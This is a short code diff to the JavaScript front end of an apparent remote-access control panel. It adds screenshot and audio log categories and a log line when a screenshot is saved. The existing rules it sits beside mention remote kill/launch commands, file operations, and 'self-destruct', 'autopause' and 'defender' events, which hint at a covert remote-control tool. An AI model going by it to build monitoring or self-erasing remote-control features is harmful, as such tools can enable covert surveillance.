@@ -3549,7 +3549,9 @@ const state = {
 const _logStore = [];   // { ts: Date, level, msg, cat }
 const _LOG_CAT_RULES = [
   { cat:'auth',       re: /logged in|login fail|client joined|client left|other client/i },
-  { cat:'stream',     re: /stream|h\.264|webcodec|recording/i },
+  { cat:'screenshot', re: /screenshot/i },
+  { cat:'audio',      re: /^audio | recordings?\b/i },
+  { cat:'stream',     re: /stream|h\.264|webcodec|^recording started/i },
   { cat:'files',      re: /file channel|download:|upload:|delete:|rename:|new folder:/i },
   { cat:'system',     re: /kill(ed)?|launch:|service /i },
   { cat:'security',   re: /threat|autopause|self[\s-]destruct|defender/i },
@@ -5600,6 +5602,7 @@ function takeScreenshot() {
   a.href = canvas.toDataURL('image/png');
   a.download = 'screenshot_' + Date.now() + '.png';
   a.click();
+  addLog('Screenshot saved: ' + a.download, 'OK');
 }
 function toggleFullscreen() {
   if (document.fullscreenElement || document.webkitFullscreenElement) {
@@ -12492,6 +12495,8 @@ const _LOG_CATS_META = [
   { id:'connection', label:'Connection',  icon:'🔌' },
   { id:'auth',       label:'Auth',        icon:'🔐' },
   { id:'stream',     label:'Stream',      icon:'🖥️' },
+  { id:'screenshot', label:'Screenshots', icon:'📷' },
+  { id:'audio',      label:'Audio',       icon:'🎙️' },
   { id:'files',      label:'Files',       icon:'📁' },
   { id:'system',     label:'System',      icon:'⚙️' },
   { id:'security',   label:'Security',    icon:'🛡️' },
